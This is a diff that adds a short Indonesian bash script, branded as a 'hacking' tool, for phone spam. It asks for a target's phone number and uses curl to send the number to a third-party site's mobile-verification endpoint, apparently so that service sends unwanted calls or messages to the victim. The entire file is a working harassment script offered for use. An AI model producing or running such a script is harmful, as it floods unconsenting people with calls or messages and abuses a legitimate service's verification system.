@@ -1,0 +1,22 @@
+# mr.foxs hacking terhebat di sini
+clear
+figlet "MR.FOX-S"
+echo "----------------------------------"
+echo "HACKER : MR.FOXS"
+echo "TANGGAL: 26-11-25"
+echo "TOOLS :  SPAM TLP"
+echo "----------------------------------"
+echo 
+echo "PILIH TOOLS HACKING"
+echo "[1] COBA TOOLS CALL/TLP"
+echo "[2] UNLIMITED CALL/TLP"
+read -p "[?] PILIH BOY :  " pil;
+#jan suka NYOLONG SC GUA
+if [ $pil = 1 ]
+then
+read -p "Masukan nomor nya  bangsad : " nomor
+link="https://id.jagreward.com/member/verify-mobile/$nomor"
+curl -s $link
+else
+echo 'Terima kasih'
+fi
